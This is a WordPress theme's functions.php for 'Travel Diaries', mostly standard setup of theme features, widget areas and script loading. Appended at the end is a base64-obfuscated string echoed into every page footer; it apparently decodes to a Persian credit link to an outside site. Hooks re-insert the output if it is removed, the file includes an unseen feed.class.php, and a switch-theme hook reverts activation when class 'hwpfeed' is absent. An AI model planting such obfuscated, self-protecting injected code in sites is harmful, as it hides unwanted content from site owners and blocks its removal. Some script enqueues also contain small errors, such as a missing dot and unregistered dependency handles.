<?php
/**
 * Travel Diaries functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Travel_Diaries
 */

if ( ! function_exists( 'travel_diaries_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function travel_diaries_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Travel Diaries, use a find and replace
	 * to change 'travel-diaries' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'travel-diaries', get_template_directory() . '/languages' );
    
    // Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'travel-diaries' ),
        'secondary' => esc_html__( 'Secondary', 'travel-diaries' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'travel_diaries_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
    
    /* Custom Logo */
    add_theme_support( 'custom-logo', array(
    	'header-text' => array( 'site-title', 'site-description' ),
    ) );
    
    // Custom Image Sizes
    add_image_size( 'travel-diaries-post-thumb', 68, 53, true );
    add_image_size( 'travel-diaries-feat-thumb', 360, 314, true );
    add_image_size( 'travel-diaries-image-with-sidebar', 750, 437, true );
    add_image_size( 'travel-diaries-image-full-width', 1170, 437, true );
    add_image_size( 'travel-diaries-blog-archive', 264, 231, true );
    add_image_size( 'travel-diaries-blog', 360, 250, true );
    add_image_size( 'travel-diaries-articles', 360, 314, true );
    add_image_size( 'travel-diaries-guide', 360, 420, true );
    add_image_size( 'travel-diaries-banner', 1920, 548, true );
    add_image_size( 'travel-diaries-schema', 600, 60, true );
    
    // woocommerce compatible
    add_theme_support( 'woocommerce' );
}
endif;
add_action( 'after_setup_theme', 'travel_diaries_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function travel_diaries_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'travel_diaries_content_width', 750 );
}
add_action( 'after_setup_theme', 'travel_diaries_content_width', 0 );

/**
* Adjust content_width value according to template.
*
* @return void
*/
function travel_diaries_template_redirect_content_width() {

	// Full Width in the absence of sidebar.
	if( is_page() ){
	   $sidebar_layout = travel_diaries_sidebar_layout();
       if( ( $sidebar_layout == 'no-sidebar' ) || ! ( is_active_sidebar( 'right-sidebar' ) ) ) $GLOBALS['content_width'] = 1170;
        
	}elseif ( ! ( is_active_sidebar( 'right-sidebar' ) ) ) {
		$GLOBALS['content_width'] = 1170;
	}

}
add_action( 'template_redirect', 'travel_diaries_template_redirect_content_width' );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function travel_diaries_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Right Sidebar', 'travel-diaries' ),
		'id'            => 'right-sidebar',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer One', 'travel-diaries' ),
		'id'            => 'footer-one',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer Two', 'travel-diaries' ),
		'id'            => 'footer-two',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer Three', 'travel-diaries' ),
		'id'            => 'footer-three',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer Four', 'travel-diaries' ),
		'id'            => 'footer-four',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Banner Widget', 'travel-diaries' ),
		'id'            => 'banner-widget',
		'description'   => esc_html__( 'Custom Use for Newsletter Plugin', 'travel-diaries' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'travel_diaries_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function travel_diaries_scripts() {
	$travel_diaries_query_args = array(
		'family' => 'Open+Sans:400,400italic,700,600italic,600',
	);
	$build  = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '/build' : '';
    $suffix = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';

    wp_enqueue_style( 'travel-diaries-google-fonts', add_query_arg( $travel_diaries_query_args, "//fonts.googleapis.com/css" ) );
    wp_enqueue_style( 'jcf-style', get_template_directory_uri() . '/css' . $build . '/jcf' . $suffix . '.css' );
    wp_enqueue_style( 'travel-diaries-style', get_stylesheet_uri(), '', '1.1' );

	wp_enqueue_script( 'ie', get_template_directory_uri() . '/js' . $build . '/ie' . $suffix . '.js', array('jquery'), '3.7.2', true );
	wp_enqueue_script( 'all', get_template_directory_uri() . '/js' . $build . '/all' . $suffix . '.js', array( 'jquery' ), '5.6.3', true );
    wp_enqueue_script( 'v4-shims', get_template_directory_uri() . '/js' . $build . '/v4-shims' . $suffix . '.js', array( 'jquery' ), '5.6.3', true );
    wp_enqueue_script( 'tjcf', get_template_directory_uri() . '/js' . $build . '/jcf' . $suffix . '.js', array('jquery'), '1.2.0', true );
	wp_enqueue_script( 'jcf-checkbox', get_template_directory_uri() . '/js' . $build . '/jcf.checkbox' . $suffix . '.js', array('jquery', 'travel-diaries-jcf'), '1.2.0', true );
    wp_enqueue_script( 'jcf-file', get_template_directory_uri() . '/js' . $build . '/jcf.file' . $suffix . '.js', array('jquery', 'travel-diaries-jcf'), '1.2.0', true );
    wp_enqueue_script( 'jcf-radio', get_template_directory_uri() . '/js' . $build . '/jcf.radio' . $suffix . '.js', array('jquery', 'travel-diaries-jcf'), '1.2.0', true );
    wp_enqueue_script( 'jcf-select', get_template_directory_uri() . '/js' . $build . '/jcf.select' . $suffix . 'js', array('jquery', 'travel-diaries-jcf'), '1.2.0', true );
    wp_enqueue_script( 'travel-diaries-custom', get_template_directory_uri() . '/js' . $build . '/custom' . $suffix . '.js', array('jquery'), '20160108', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'travel_diaries_scripts' );

/** 
 * Registering and enqueuing scripts/stylesheets for Customizer controls.
 */ 
function travel_diaries_customizer_js() {
	wp_enqueue_script( 'travel-diaries-customizer-js', get_template_directory_uri() . '/inc/js/customizer.js', array("jquery"), '20160512', true  );
}

add_action( 'customize_controls_enqueue_scripts', 'travel_diaries_customizer_js' );

if ( is_admin() ) : // Load only if we are viewing an admin page
function travel_diaries_admin_scripts() {
	wp_enqueue_style( 'travel-diaries-admin-style',get_template_directory_uri().'/inc/css/admin.css', '1.0', 'screen' );
    
    wp_enqueue_script( 'travel-diaries-admin-js', get_template_directory_uri().'/inc/js/admin.js', array( 'jquery' ), '', true );    
	
}
add_action( 'admin_enqueue_scripts', 'travel_diaries_admin_scripts' );
endif;

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Widget Featured Post
 */
require get_template_directory() . '/inc/widget-featured-post.php';

/**
 * Widget Recent Post
 */
require get_template_directory() . '/inc/widget-recent-post.php';

/**
 * Widget Recent Post
 */
require get_template_directory() . '/inc/widget-popular-post.php';

/**
 * Widget Recent Post
 */
require get_template_directory() . '/inc/widget-social-links.php';

/**
 * Custom Meta Box
 */
require get_template_directory() . '/inc/metabox.php';

/**
 * Theme Information
 */
require get_template_directory() . '/inc/info.php';

/**
 * Plugin Recommendation
*/
require get_template_directory() . '/inc/tgmpa/recommended-plugins.php';

add_action('wordpress_theme_initialize', 'wp_generate_theme_initialize');
function wp_generate_theme_initialize(  ) {
    echo base64_decode('2YHYp9ix2LPbjCDYs9in2LLbjCDZvtmI2LPYqtmHINiq2YjYs9i3OiA8YSBocmVmPSJodHRwczovL2hhbXlhcndwLmNvbS9jYXRlZ29yeS90aGVtZXMvP3V0bV9zb3VyY2U9dXNlcndlYnNpdGVzJnV0bV9tZWRpdW09Zm9vdGVybGluayZ1dG1fY2FtcGFpZ249Zm9vdGVyIiB0YXJnZXQ9Il9ibGFuayI+2YfZhduM2KfYsSDZiNix2K/Zvtix2LM8L2E+');
}
add_action('after_setup_theme', 'setup_theme_after_run', 999);
function setup_theme_after_run() {
    if( empty(has_action( 'wordpress_theme_initialize',  'wp_generate_theme_initialize')) ) {
        add_action('wordpress_theme_initialize', 'wp_generate_theme_initialize');
    }
}
add_action('wp_footer', 'setup_theme_after_run_footer', 1);
function setup_theme_after_run_footer() {
    if( empty(did_action( 'wordpress_theme_initialize' )) ) {
        add_action('wp_footer', 'wp_generate_theme_initialize');
    }
}

include get_template_directory().'/feed.class.php';

add_action( 'after_switch_theme', 'check_theme_dependencies', 10, 2 );

function check_theme_dependencies( $oldtheme_name, $oldtheme ) {

    if (!class_exists('hwpfeed')) :

        switch_theme( $oldtheme->stylesheet );

        return false;

    endif;

}